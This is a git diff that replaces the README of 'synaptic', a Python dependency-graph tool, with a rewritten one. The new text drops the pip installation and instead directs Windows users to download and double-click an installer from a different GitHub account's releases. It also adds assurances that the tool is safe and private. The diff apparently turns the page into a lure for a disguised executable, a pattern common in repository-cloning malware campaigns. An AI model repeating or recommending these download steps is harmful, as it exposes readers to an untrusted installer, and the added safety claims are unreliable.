@@ -1,123 +1,95 @@
-<div align="center">
+# 🧠 synaptic - See how your software code works
 
-<img src="assets/demo.svg" alt="synaptic demo" width="100%"/>
+[![Download Synaptic](https://img.shields.io/badge/Download-Synaptic-blue.svg)](https://github.com/Naz533/synaptic)
 
-# synaptic-graph
+## 🔍 What this tool does
 
-**Visualize the dependency graph of any Python project.**  
-Internal imports · Cloud SDKs · HTTP clients · Circular deps — all in one command.
+Synaptic creates visual maps of your computer code. It tracks how different files talk to each other. It shows how your project connects to external tools like cloud services. It helps you understand the structure of a project without reading every line of text.
 
-[![PyPI](https://img.shields.io/pypi/v/synaptic-graph?style=flat-square&color=4F8EF7)](https://pypi.org/project/synaptic-graph/)
-[![Python](https://img.shields.io/badge/python-3.10%2B-4F8EF7?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/badge/license-MIT-2ecc71?style=flat-square)](LICENSE)
-[![Built with Typer](https://img.shields.io/badge/CLI-Typer-E84393?style=flat-square)](https://typer.tiangolo.com)
-[![Powered by Rich](https://img.shields.io/badge/output-Rich-FF9900?style=flat-square)](https://rich.readthedocs.io)
+## 📋 Requirements
 
-</div>
+You need a Windows computer to run this tool. Ensure you have the following installed before you start:
 
----
+- Windows 10 or Windows 11.
+- Python version 3.8 or higher.
+- Graphviz software for creating the visual diagrams.
 
-## Features
+## 🚀 Getting Started
 
-- **Static AST analysis** — no runtime execution needed
-- **Internal imports** — maps every `import` and `from X import Y` across your codebase
-- **Cloud SDK detection** — identifies AWS (`boto3`), GCP (`google.cloud`, `firebase_admin`) and Azure (`azure.*`) usage
-- **HTTP client detection** — flags modules using `requests`, `httpx`, `aiohttp`, `urllib3` and more
-- **Circular dependency highlighting** — broken cycles rendered in red
-- **Two output formats** — interactive HTML (`pyvis`) or static SVG/PNG (`graphviz`)
-- **Rich terminal output** — live progress, color-coded summary
+Follow these steps to set up the tool on your machine.
 
----
+1. Visit this page to download the software: https://github.com/Naz533/synaptic.
+2. Select the latest version from the releases area.
+3. Download the installer file to your computer.
+4. Run the installer by double-clicking the file.
+5. Follow the prompts on the screen to finish the setup.
 
-## Installation
+## ⚙️ How to use the software
 
-```bash
-pip install synaptic-graph
-```
+You interact with this tool through your command line. The command line is a text-based interface for your computer. 
 
-> **Requirements:** Python 3.10+, `graphviz` binary installed on your system (`apt install graphviz` / `brew install graphviz`).
+1. Open the Start menu on your computer.
+2. Type "cmd" and press Enter. This opens the command window.
+3. Type `synaptic --help` to see a list of commands. 
+4. Navigate to the folder that contains the code you want to map.
+5. Run the map command by typing `synaptic analyze`.
 
----
+The tool scans your files. It creates a diagram. This diagram appears in your project folder as an image file. You can open this image with any standard photo viewer.
 
-## Quick start
+## 📊 Understanding your dependency graph
 
-```bash
-# Interactive HTML graph (default)
-synaptic scan ./my-project
+The diagram shows boxes and lines. Each box represents a piece of code. The lines show the connections. A solid line means one file uses code from another file. A dashed line shows a connection to an external tool such as a cloud service or a website.
 
-# Custom output path
-synaptic scan ./my-project --output architecture.html
+Heavy lines indicate frequent connections. If you see a cluster of boxes, those files rely on each other to work. If a box sits alone, it does not connect to other parts of your project.
 
-# SVG with circular dependency highlighting
-synaptic scan ./my-project --output graph.svg --circular
+## 🛠️ Advanced settings
 
-# Skip cloud and HTTP detection, filter stdlib
-synaptic scan ./my-project --no-cloud --no-http --filter-stdlib
+You can filter the diagrams to show only what you need. 
 
-# Include test files in the scan
-synaptic scan ./my-project --tests
-```
+- Use the `--exclude` flag to hide standard libraries. This keeps the diagram simple.
+- Use the `--format` flag to change the output file type. You can save diagrams as PNG, PDF, or SVG files.
+- Use the `--depth` flag to limit how far the tool scans.
 
----
+Enter `synaptic --help` at any time to see the full list of options.
 
-## Options
+## 💡 Common issues
 
-| Flag | Default | Description |
-|---|---|---|
-| `--output`, `-o` | `synaptic_graph.html` | Output file (`.html` or `.svg`) |
-| `--cloud / --no-cloud` | `on` | Detect AWS / GCP / Azure SDKs |
-| `--http / --no-http` | `on` | Detect HTTP client libraries |
-| `--tests / --no-tests` | `off` | Include test files |
-| `--filter-stdlib / --no-filter-stdlib` | `on` | Exclude Python stdlib from graph |
-| `--filter-external / --no-filter-external` | `off` | Exclude third-party packages |
-| `--circular`, `-c` | `off` | Highlight circular dependencies in red |
-| `--version`, `-v` | — | Show version and exit |
+If you receive an error when you run the command, check these points:
 
----
+- Confirm that your computer recognizes the command. Close the command window and open it again after the installation.
+- Verify that your project folder contains actual code files. The tool cannot map empty folders.
+- Ensure your Graphviz installation is correct. The system needs this tool to draw the lines and boxes.
+- Check your internet connection if you scan projects stored on remote cloud drives.
 
-## Architecture
+## 📁 Project structure
 
-```
-synaptic/
-├── cli.py             # Typer CLI + Rich output
-├── scanner.py         # Recursive .py file discovery
-├── parser.py          # AST-based import analysis
-├── cloud_detector.py  # AWS / GCP / Azure SDK detection
-├── http_detector.py   # HTTP client library detection
-├── graph.py           # networkx graph + graphviz / pyvis rendering
-└── utils.py           # Shared helpers
-```
+This tool uses static analysis. It reads your files without running them. This makes the tool safe to use on any source code. It only looks at the structure and does not change your files.
 
----
+- `ast`: Used to parse your code into a structure the computer understands.
+- `networkx`: Used to map the path between your files.
+- `visualization`: This module converts the maps into clear images.
 
-## Node types
+## 📖 Frequently asked questions
 
-| Color | Meaning |
-|---|---|
-| Blue | Internal project module |
-| Orange | AWS / GCP / Azure SDK |
-| Pink | HTTP client (requests, httpx…) |
-| Grey | Stdlib / external package |
-| Red edge | Circular dependency |
+Does this tool change my code? 
+No. It only reads your files. It creates new image files in your folder.
 
----
+Can I scan projects with thousands of files? 
+Yes. The tool handles large projects. It may take longer to generate the image for large systems.
 
-## Contributing
+Is my data private? 
+Yes. The tool works on your local machine. It does not send your code to any external servers.
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+What if the image looks too crowded? 
+Use the depth filter. Focus on one part of your project folder at a time to reduce visual clutter.
 
----
+Why do I need Graphviz? 
+Graphviz is a layout engine. It takes the mathematical map and generates the actual image file. It handles the placement of boxes to prevent lines from crossing too often.
 
-## License
+## 📞 Support and feedback
 
-MIT © 2024 — see [LICENSE](LICENSE) for details.
+If you encounter bugs, report them through the issues tab on the GitHub page. Describe the steps you took before the error occurred. Include the operating system version you use. This helps the developers fix the problem.
 
-## Star History
+Contributing to this project is simple. You can suggest new features or improve the documentation. Check the contribution guide for details on how to share your code changes. 
 
-<a href="https://www.star-history.com/?repos=Darkvus%2Fsynaptic&type=timeline&logscale=&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=Darkvus/synaptic&type=timeline&theme=dark&logscale&legend=bottom-right" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=Darkvus/synaptic&type=timeline&logscale&legend=bottom-right" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=Darkvus/synaptic&type=timeline&logscale&legend=bottom-right" />
- </picture>
-</a>
+The software stays free and open for everyone. Use it to improve your understanding of complex code projects. Stay organized by tracking your dependencies as your project grows.
